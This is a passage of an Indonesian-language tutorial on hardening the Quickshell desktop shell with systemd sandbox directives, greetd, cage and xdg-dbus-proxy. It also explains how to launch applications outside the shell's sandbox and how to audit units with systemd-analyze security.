**Dampak:** Jika `ProtectHome=yes`, Quickshell **tidak bisa** membaca `~/.config/quickshell/my-shell` (konfigurasinya sendiri!). Anda perlu `BindReadOnlyPaths` atau `ReadWritePaths` untuk mengizinkan akses ke direktori tertentu:

```ini
ProtectHome=yes
BindReadOnlyPaths=/home/user/.config/quickshell/my-shell
```

**Penjelasan:**
- `ProtectHome=yes`: Menyembunyikan seluruh `/home`.
- `BindReadOnlyPaths=...`: **Mengecualikan** path tertentu dari penyembunyian—path tersebut tetap terlihat (read-only).

### 6.5 [TAMBAHAN] `SystemCallFilter`: Memilih Syscall yang Diizinkan

`SystemCallFilter` dapat digunakan dalam dua mode:

1.  **Blocklist** (`~@grup`): Blokir grup syscall tertentu, izinkan sisanya.
    ```ini
    SystemCallFilter=~@clock @debug @module @mount @obsolete @reboot @setuid @swap
    ```

2.  **Allowlist** (`@system-service`): Hanya izinkan syscall yang umum untuk service, blokir sisanya.
    ```ini
    SystemCallFilter=@system-service
    SystemCallFilter=~@privileged @resources
    ```

**Rekomendasi:** Mulai dengan blocklist yang konservatif (seperti contoh di atas), lalu **uji** shell Anda. Jika ada yang rusak, longgarkan filter.

---

## 7. Meluncurkan Aplikasi di Luar Kurungan Shell

### 7.1 Masalah: Pewarisan Sandbox

Ketika Quickshell berjalan di dalam `bwrap` **atau** unit systemd dengan hardening, **semua proses yang diluncurkannya mewarisi batasan tersebut**. Jika Anda meng-unshare network, aplikasi tidak punya jaringan. Jika Anda membatasi `RestrictAddressFamilies`, aplikasi tidak bisa menggunakan TCP.

### 7.2 Solusi 1: Luncurkan melalui Compositor

Jika shell Anda adalah bagian dari compositor (mis. Hyprland), aplikasi yang diluncurkan melalui **keybind compositor** **tidak** mewarisi sandbox shell—karena mereka diluncurkan oleh compositor, bukan oleh shell.

**Contoh di Hyprland:**

```conf
# hyprland.conf
bind = SUPER, Return, exec, foot
bind = SUPER, B, exec, firefox
```

**Penjelasan:** `exec` di Hyprland menjalankan perintah sebagai **proses anak compositor**, bukan sebagai proses anak Quickshell. Aplikasi **tidak** mewarisi sandbox shell.

**Keterbatasan:** Ini hanya berfungsi jika Anda meluncurkan aplikasi melalui keybind compositor, **bukan** melalui launcher QML (yang menggunakan `Process`).

### 7.3 Solusi 2: `systemd-run --user` (Cara yang Benar)

`systemd-run --user` menjalankan perintah sebagai **unit systemd transient** yang **terpisah** dari unit shell. Ini adalah cara yang paling andal untuk "keluar" dari sandbox shell.

**Contoh:**

```bash
systemd-run --user --scope firefox
```

**Namun, ada jebakan:** Berdasarkan dokumentasi:

> "Never use `--scope` for this: scope mode wraps a child of the sandboxed process, so it inherits exactly the restrictions the wrapper exists to escape."

**Terjemahan:** **Jangan gunakan `--scope`!** Mode `--scope` membungkus **proses anak** dari proses yang di-sandbox, sehingga **mewarisi** batasan yang sama. Anda harus menggunakan **mode unit transient** (tanpa `--scope`):

```bash
systemd-run --user --unit=firefox-transient firefox
```

**Penjelasan:**
- `--user`: Menjalankan sebagai unit **user** (bukan sistem).
- `--unit=firefox-transient`: Nama unit (opsional; jika tidak diberikan, systemd akan menghasilkan nama acak).
- `firefox`: Perintah yang dijalankan.

**Mengapa ini berhasil?** `systemd-run` berbicara dengan **systemd user manager** melalui D-Bus, dan systemd **mem-fork** proses baru sebagai **unit terpisah**. Unit ini **tidak** berada di dalam namespace atau cgroup shell—ia berada di **luar** sandbox.

**Prasyarat:** Quickshell harus memiliki akses ke D-Bus untuk berbicara dengan systemd user manager. Jika Anda menggunakan `xdg-dbus-proxy`, Anda perlu mengizinkan `--talk=org.freedesktop.systemd1`—tetapi ini **membuka kembali** jalur sandbox escape yang ingin Anda tutup!

**Dilema:** Untuk menggunakan `systemd-run` dari dalam sandbox, Anda perlu akses ke `org.freedesktop.systemd1`. Tetapi akses itu sendiri adalah **sandbox escape vector**. **Solusi:** Gunakan **mekanisme di luar shell** (keybind compositor) untuk meluncurkan aplikasi, atau gunakan **D-Bus proxy dengan kebijakan yang sangat spesifik** (mis. hanya mengizinkan `StartTransientUnit` untuk perintah tertentu).

### 7.4 Solusi 3: `Process.startDetached()`—Tidak Cukup

Quickshell menyediakan `Process.startDetached()` yang menjalankan proses **terpisah** dari lifecycle Quickshell. Namun, **ini tidak keluar dari sandbox** jika Quickshell sendiri di-sandbox. Proses yang di-start detached masih **mewarisi** namespace dan batasan.

**Kesimpulan:** `startDetached()` berguna untuk melepaskan proses dari lifecycle Quickshell (mis. agar tidak mati saat shell restart), tetapi **bukan** untuk keluar dari sandbox.

---

## 8. [TAMBAHAN] Audit dengan `systemd-analyze security`

### 8.1 Cara Mengukur Hardening

`systemd-analyze security` memberikan **skor eksposur** (0.0–10.0) untuk suatu unit. Skor **rendah** berarti sandbox ketat; skor **tinggi** berarti eksposur besar.

```bash
# Audit unit shell Anda
systemd-analyze --user security quickshell.service

# Audit unit sistem (mis. greetd)
systemd-analyze security greetd.service
```

**Contoh output:**

```text
→ Overall exposure level for quickshell.service: 4.2 OK 🙂

  NAME                                          DESCRIPTION                                 EXPOSURE
✓ PrivateTmp=                                 /tmp and /var/tmp are isolated                0.2
✓ NoNewPrivileges=                            New privileges are not allowed                0.0
✗ RestrictAddressFamilies=                    Address families are not restricted           0.5
...
```

**Penjelasan:**
- `✓`: Direktif diterapkan.
- `✗`: Direktif **tidak** diterapkan (celah).
- `EXPOSURE`: Kontribusi terhadap skor total.

### 8.2 Peringatan: Skor Bukan Tujuan

Dokumentasi Arch Wiki memperingatkan:

> "The score is slightly misleading. Only a simple Hello world can achieve a near perfect score. No application can use all the sandboxing settings."

**Terjemahan:** Skor yang sempurna **tidak mungkin** untuk aplikasi nyata. Gunakan skor sebagai **pengukur kemajuan**, bukan tujuan mutlak. Fokus pada **direktif yang relevan** untuk shell Anda.

### 8.3 Direktif yang Paling Berdampak untuk Quickshell

| Direktif | Dampak pada Skor | Relevansi untuk Shell |
|---|---|---|
| `NoNewPrivileges=yes` | Tinggi | **Selalu** gunakan. |
| `PrivateTmp=yes` | Sedang | **Gunakan**—mencegah serangan symlink di `/tmp`. |
| `RestrictAddressFamilies=` | Tinggi | **Gunakan dengan hati-hati**—bisa memutus jaringan aplikasi anak. |
| `ProtectSystem=full` | Tinggi | **Gunakan**—mencegah modifikasi `/usr`, `/etc`. |
| `ProtectHome=` | Tinggi | **Gunakan dengan `BindReadOnlyPaths`** untuk konfigurasi shell. |
| `SystemCallFilter=` | Tinggi | **Gunakan** blocklist konservatif. |

---

## 9. Terminologi Esensial

| Istilah | Definisi |
|---|---|
| **Greetd** | Login manager minimalis yang menjalankan greeter dan meluncurkan sesi. |
| **Greeter** | Program antarmuka login (di sini: Quickshell) yang berjalan sebagai pengguna terbatas. |
| **`cage`** | Compositor Wayland kios yang menjalankan satu aplikasi fullscreen. |
| **`GreetdState`** | Enum status koneksi greetd: `Inactive`, `Authenticating`, `ReadyToLaunch`, `Launching`, `Launched`. |
| **`xdg-dbus-proxy`** | Proxy penyaring D-Bus. |
| **`--filter`** | Mode penyaringan D-Bus. |
| **`--own` / `--talk` / `--see`** | Tingkat kebijakan D-Bus. |
| **`NoNewPrivileges`** | Direktif systemd yang mencegah eskalasi hak istimewa. |
| **`RestrictAddressFamilies`** | Direktif systemd yang membatasi family alamat jaringan. |
| **`systemd-run --user`** | Menjalankan perintah sebagai unit systemd transient, di luar sandbox shell. |
| **`systemd-analyze security`** | Alat untuk mengukur hardening unit systemd. |

---

## 10. Visualisasi: Peta Arsitektur Modul 4.3

```text
┌──────────────────────────────────────────────────────────────────┐
│                        BOOT & LOGIN                              │
│                                                                  │
│  greetd (daemon)                                                 │
│    │                                                             │
│    ├──► Menjalankan greeter: cage -s -- quickshell -p .../greeter│
│    │         │                                                   │
│    │         ▼                                                   │
│    │    ┌─────────────────────────────────────────────────────┐  │
│    │    │  Quickshell Greeter (user: greeter)                 │  │
│    │    │  ► UI login (username, password)                    │  │
│    │    │  ► Greetd.createSession(user)                       │  │
│    │    │  ► Greetd.respond(password)                         │  │
│    │    │  ► Greetd.launch(['Hyprland'])                      │  │
│    │    └─────────────────────────────────────────────────────┘  │
│    │                                                             │
│    └──► Setelah autentikasi: meluncurkan sesi sebagai user       │
│              │                                                   │
│              ▼                                                   │
│         ┌─────────────────────────────────────────────────────┐  │
│         │  Sesi Pengguna (Hyprland + Quickshell Shell)        │  │
│         │                                                     │  │
│         │  ┌────────────────────────────────────────────────┐ │  │
│         │  │  Quickshell Shell (unit systemd user)          │ │  │
│         │  │  ► Hardening: NoNewPrivileges, PrivateTmp,     │ │  │
│         │  │    RestrictAddressFamilies, dll.               │ │  │
│         │  │  ► D-Bus via xdg-dbus-proxy                    │ │  │
│         │  │  ► Aplikasi diluncurkan via systemd-run        │ │  │
│         │  │    --user (di luar sandbox)                    │ │  │
│         │  └────────────────────────────────────────────────┘ │  │
│         └─────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────────┘
```

**Penjelasan diagram:**
- **Greetd** adalah **lapisan pertama**: ia menjalankan greeter sebagai pengguna terbatas.
- **Greeter** (Quickshell) hanya berbicara dengan greetd melalui IPC—tidak memiliki akses ke home directory pengguna.
- Setelah autentikasi, **sesi pengguna** diluncurkan sebagai pengguna sebenarnya.
- Di dalam sesi, **Quickshell shell** berjalan sebagai unit systemd user dengan hardening.
- **D-Bus** disaring oleh `xdg-dbus-proxy`.
- **Aplikasi** diluncurkan melalui `systemd-run --user` agar berada di luar sandbox shell.

---

## 11. Hubungan dengan Modul Lain

| Modul | Hubungan |
|---|---|
| **Modul 4.1 (Threat Model & Sandboxing)** | Threat model menentukan aset yang dilindungi greetd (kredensial) dan shell (sesi). `bwrap` adalah **lapisan isolasi** yang melengkapi hardening systemd. |
| **Modul 4.2 (Lockscreen)** | Pola PAM yang dipelajari di lockscreen **tidak** berlaku langsung di greeter (karena greetd menangani PAM), tetapi **prinsip penanganan kredensial** (pembersihan memori, anti-log) tetap sama. |
| **Fase 3 (IPC)** | `Greetd.createSession`, `respond`, dan `launch` adalah **operasi IPC** ke greetd. Pemahaman tentang D-Bus (untuk `xdg-dbus-proxy`) juga berasal dari Fase 3. |
| **Fase 1 (Instance Locking)** | `ShellId` memastikan hanya satu instance shell yang berjalan. Di greetd, hanya satu greeter yang berjalan pada satu waktu. |

---

## 12. Sumber Referensi

- **Quickshell `Greetd` (docs):** [https://quickshell.org/docs/v0.2.1/types/Quickshell.Services.Greetd/Greetd](https://quickshell.org/docs/v0.2.1/types/Quickshell.Services.Greetd/Greetd)
- **Quickshell `GreetdState` (docs):** [https://quickshell.org/docs/v0.2.1/types/Quickshell.Services.Greetd/GreetdState](https://quickshell.org/docs/v0.2.1/types/Quickshell.Services.Greetd/GreetdState)
- **greetd (sumber resmi):** [https://sr.ht/~kennylevinsen/greetd/](https://sr.ht/~kennylevinsen/greetd/)
- **Arch Wiki: Greetd:** [https://wiki.archlinux.org/title/Greetd](https://wiki.archlinux.org/title/Greetd)
- **`xdg-dbus-proxy(1)` man page:** [https://manpages.debian.org/unstable/xdg-dbus-proxy/xdg-dbus-proxy.1.en.html](https://manpages.debian.org/unstable/xdg-dbus-proxy/xdg-dbus-proxy.1.en.html)
- **`systemd.exec` man page (semua direktif hardening):** [https://www.freedesktop.org/software/systemd/man/systemd.exec.html](https://www.freedesktop.org/software/systemd/man/systemd.exec.html)
- **`systemd-analyze security`:** [https://www.freedesktop.org/software/systemd/man/systemd-analyze.html](https://www.freedesktop.org/software/systemd/man/systemd-analyze.html)
- **Arch Wiki: systemd/Sandboxing:** [https://wiki.archlinux.org/title/Systemd/Sandboxing](https://wiki.archlinux.org/title/Systemd/Sandboxing)
- **Cage (compositor kios):** [https://www.hjdskes.nl/projects/cage/](https://www.hjdskes.nl/projects/cage/)
- **`systemd-run` man page:** [https://www.freedesktop.org/software/systemd/man/systemd-run.html](https://www.freedesktop.org/software/systemd/man/systemd-run.html)

---

## 13. Tips dan Praktik Terbaik

- **Selalu jalankan greeter sebagai pengguna terbatas (`greeter`), bukan root.** Ini adalah prinsip least privilege yang paling dasar.
- **Gunakan `cage` untuk greeter.** Ia minimal, aman, dan mudah dikonfigurasi.
- **Saring D-Bus dengan `xdg-dbus-proxy`.** Jangan pernah bind socket bus sesi mentah ke dalam sandbox.
- **Mulai dengan `--own` untuk layanan yang perlu Anda miliki**, `--talk` untuk yang perlu Anda ajak bicara, dan `--see` untuk yang hanya perlu Anda lihat.
- **Gunakan `systemd-analyze security` sebagai pengukur kemajuan**, bukan tujuan. Fokus pada direktif yang relevan.
- **Uji hardening secara bertahap.** Tambahkan satu direktif, uji shell, lalu tambahkan yang berikutnya. Jangan menerapkan semua sekaligus.
- **Gunakan `systemd-run --user` (bukan `--scope`)** untuk meluncurkan aplikasi di luar sandbox shell.
- **Pahami jebakan pewarisan.** `RestrictAddressFamilies` pada shell akan memutus jaringan aplikasi yang diluncurkan darinya.

---

## 14. Potensi Kesalahan Umum & Solusi

| Kesalahan | Solusi |
|---|---|
| **Menjalankan greeter sebagai root.** | Buat pengguna `greeter` dan set `user = 'greeter'` di `config.toml`. |
| **Menggunakan `cage` tanpa `-s`.** | Tanpa `-s`, cage tidak dalam mode kios dan mungkin tidak berperilaku seperti yang diharapkan. |
| **Meng-bind socket D-Bus sesi mentah ke sandbox.** | Gunakan `xdg-dbus-proxy` dan bind socket hasil proxy. |
| **Lupa `--filter` pada `xdg-dbus-proxy`.** | Tanpa `--filter`, proxy meneruskan semua pesan—tidak ada penyaringan. |
| **Menerapkan `RestrictAddressFamilies=AF_UNIX` pada shell, lalu bingung mengapa Firefox tidak punya jaringan.** | Luncurkan Firefox melalui keybind compositor atau `systemd-run --user` (di luar unit shell). |
| **Menggunakan `systemd-run --scope` untuk keluar dari sandbox.** | **Jangan.** `--scope` mewarisi batasan. Gunakan mode unit transient (tanpa `--scope`). |
| **Menganggap skor `systemd-analyze security` harus 0.0.** | Skor sempurna tidak mungkin untuk aplikasi nyata. Fokus pada direktif yang relevan. |
| **Tidak menguji greeter di VM sebelum menggunakannya di sistem produksi.** | Selalu uji di VM. Greeter adalah **satu-satunya** jalan masuk—jika rusak, Anda tidak bisa login. |

---

## 15. Latihan dan Checkpoint

### 15.1 Latihan (Sesuai Kurikulum Asli)

1.  **Jalankan greeter di VM.** Konfigurasikan greetd dengan `cage` dan Quickshell sebagai greeter.
2.  **Saring bus sesi shell Anda.** Gunakan `xdg-dbus-proxy` dengan kebijakan minimal (hanya notifikasi dan MPRIS).
3.  **Naikkan skor `systemd-analyze`** tanpa merusak fitur. Mulai dari skor awal, tambahkan direktif satu per satu, dan uji setelah setiap perubahan.

### 15.2 Checkpoint

**Pertanyaan:** Jelaskan mengapa menerapkan `RestrictAddressFamilies` pada unit shell bisa memutus jaringan aplikasi yang diluncurkan darinya.

**Jawaban singkat:** Direktif sandbox systemd **diwariskan ke proses anak**. Jika unit shell memiliki `RestrictAddressFamilies=AF_UNIX`, maka **semua** proses yang diluncurkan oleh shell (melalui `Process` atau launcher) juga hanya bisa menggunakan `AF_UNIX`. Mereka **tidak bisa** menggunakan `AF_INET` (TCP/IP) atau `AF_INET6` (IPv6), sehingga **tidak bisa mengakses jaringan**. Untuk menghindari ini, luncurkan aplikasi melalui **keybind compositor** (yang menjalankannya sebagai proses anak compositor, bukan shell) atau melalui **`systemd-run --user`** (yang membuat unit terpisah di luar unit shell).

---

## 🎯 Motivasi

> *"Anda telah membangun benteng: tembok isolasi, pintu yang terkunci, dan penjaga yang waspada. Kini saatnya mengatur siapa yang boleh masuk, jalur mana yang boleh dilalui, dan bagaimana keluar dengan aman. Keamanan sejati adalah harmoni antara pembatasan dan kebebasan—bukan penjara, melainkan taman yang berpagar."*

---

## ✅ Konfirmasi untuk Melanjutkan

Modul 4.3 telah selesai dibahas secara komprehensif, mencakup:

- Arsitektur greetd (greeter, IPC, peluncuran sesi)
- `cage` sebagai compositor kios
- `Quickshell.Services.Greetd` (properti, fungsi, signal, `GreetdState`)
- `xdg-dbus-proxy` (cara kerja, tingkat kebijakan, contoh konfigurasi)
- Hardening unit `systemd --user` (direktif kunci, jebakan pewarisan)
- Meluncurkan aplikasi di luar kurungan (`systemd-run --user`, keybind compositor)
- **[TAMBAHAN]** Audit `systemd-analyze security`
- Terminologi, visualisasi, referensi, tips, kesalahan umum, latihan, dan checkpoint

**Fase 4 telah selesai seluruhnya.** Jika Anda ingin melanjutkan ke **Fase 5** (jika ada dalam kurikulum Anda), silakan berikan detailnya. Jika Anda ingin **mendalami ulang** bagian tertentu dari Fase 4, atau **menambahkan materi** yang belum tercakup, silakan konfirmasi.

> - **[⬆️ Ke Atas](#)**
> - **[➡️ Selanjutnya][selanjutnya]**
> - **[⬅️ Sebelumnya][sebelumnya]**
> - **[📚 Kurikulum][kurikulum]**
> - **[🏠 Home][domain]**

[domain]: ../../../../../../README.md
[kurikulum]: ../../../../README.md
[sebelumnya]: ../bagian-4/README.md
[selanjutnya]: ../bagian-6/README.md

<!----------------------------------------------------->

[0]: ./README.md
[1]: ./
[2]: ./
[3]: ./
[4]: ./
[5]: ./
[6]: ./
[7]: ./
[8]: ./
[9]: ./
[10]: ./
[11]: ./
[12]: ./
[13]: ./
[14]: ./
[15]: ./
[16]: ./
[17]: ./
[18]: ./

